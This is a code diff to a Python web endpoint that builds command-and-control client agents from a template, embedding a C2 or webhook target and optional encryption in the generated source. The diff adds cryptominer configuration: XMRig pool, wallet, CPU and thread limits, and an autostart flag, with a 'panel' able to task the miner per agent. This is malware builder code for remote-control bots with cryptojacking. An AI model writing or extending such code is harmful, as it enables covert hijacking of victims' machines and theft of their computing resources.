@@ -59,8 +59,41 @@ def build_py():
     kind = "webhook" if data.get("webhook") else "c2"
     target = check_url(data.get("webhook") or data.get("c2", ""), kind)
     encrypt = bool(data.get("encrypt", True))
+    # optional open-source XMRig defaults (https://github.com/xmrig/xmrig).
+    # Baked into CONFIG["miner"]; agent honors autostart, panel can override
+    # per task. Empty pool/wallet = miner idle until the panel tasks it.
+    miner = {}
+    if isinstance(data.get("miner"), dict):
+        m = data["miner"]
+        for k in ("pool", "wallet"):
+            if isinstance(m.get(k), str) and 0 < len(m[k]) <= 300:
+                miner[k] = m[k].strip()
+        if "threads" in m:
+            try:
+                miner["threads"] = max(0, min(128, int(m["threads"])))
+            except Exception:
+                pass
+        for k in ("cpu", "cpu_max"):
+            if k in m:
+                try:
+                    miner["cpu"] = max(1, min(100, int(m[k])))
+                except Exception:
+                    pass
+        if m.get("autostart") is True:
+            miner["autostart"] = True
+    for flat, dest in (("miner_pool", "pool"), ("miner_wallet", "wallet")):
+        if isinstance(data.get(flat), str) and data[flat].strip() and dest not in miner:
+            miner[dest] = data[flat].strip()[:300]
+    if isinstance(data.get("miner_autostart"), bool) and data["miner_autostart"]:
+        miner["autostart"] = True
+    if miner.get("pool") and miner.get("wallet") and not re.match(
+            r"^[A-Za-z0-9.-]{4,80}(:\d{2,5})?$", miner["pool"]):
+        abort(400, "miner pool must be host[:port]")
+    cfg = {"kind": kind, "target": target}
+    if miner:
+        cfg["miner"] = miner
     tpl = open(os.path.join(TDIR, "client_tpl.py")).read()
-    cfg_block, note = seal_config({"kind": kind, "target": target}, encrypt)
+    cfg_block, note = seal_config(cfg, encrypt)
     src = tpl.replace("__CONFIG_BLOCK__", cfg_block)
     return jsonify({"src": src, "encrypted": encrypt, "key_note": note,
                     "bytes": len(src)})
